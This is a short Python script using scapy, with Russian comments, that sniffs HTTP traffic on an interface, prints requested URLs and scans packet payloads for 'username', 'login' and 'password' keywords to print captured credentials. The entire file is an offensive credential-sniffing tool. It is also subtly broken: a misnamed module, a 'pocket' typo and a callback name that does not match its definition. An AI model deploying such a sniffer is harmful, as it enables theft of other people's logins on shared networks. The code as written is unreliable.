#!/usr/bin/env python
import scapy.all as scapy
from scapy.layer import http

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)

def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

def get_login_info(packet):
    if pocket.haslayer(scapy.Raw):
        load = packet[
            scapy.Raw].load  # если хочешь вывести другой уровень - изменить название пакета а в квадратных скобках уровень. поле на уровне - после скобок квадратных пишем точку и имя поля.
        keywords = ["username", "user", "login", "password", "pass"]
        for keyword in keywords:
            if keyword in load:
                return load

def process_sniffer_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("[+] HTTP Reuest >>" + url)

        login_info = get_login_info(packet)
        if login_info:
            print("\n\n [+] Possible username/password > " + login_info + "\n\n")




sniff("eth0")    #можно менять, если надо на wlan0 и тд, зависит от инконфига.
